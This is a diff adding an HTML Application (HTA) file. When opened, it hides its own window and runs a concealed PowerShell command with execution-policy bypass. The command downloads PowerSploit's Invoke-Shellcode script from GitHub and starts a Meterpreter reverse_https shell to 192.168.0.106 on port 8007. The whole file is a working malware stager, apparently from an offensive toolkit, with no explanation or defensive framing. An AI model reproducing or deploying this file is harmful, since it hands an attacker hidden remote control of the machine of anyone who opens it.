@@ -1,0 +1,24 @@
+<html>
+  <head>
+    <HTA:APPLICATION ID="oHTA"
+      APPLICATIONNAME="MSession"
+      BORDER="none"
+      SHOWINTASKBAR="no"
+      SINGLEINSTANCE="no"
+      SYSMENU="no"
+      VERSION="1.0"
+      WINDOWSTATE="minimize"
+     />
+  </head>
+
+  <body>
+    <script language="VBScript">
+      Window.ReSizeTo 0,0
+      Window.MoveTo -4000, -4000
+ 
+      Set wsh = CreateObject("wscript.shell")
+      wsh.Run "powershell -w hidden -nop -noni -exec bypass IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -payload windows/meterpreter/reverse_https -lhost 192.168.0.106 -lport 8007 -force"
+      Window.Close
+    </script>
+  </body>
+</html>
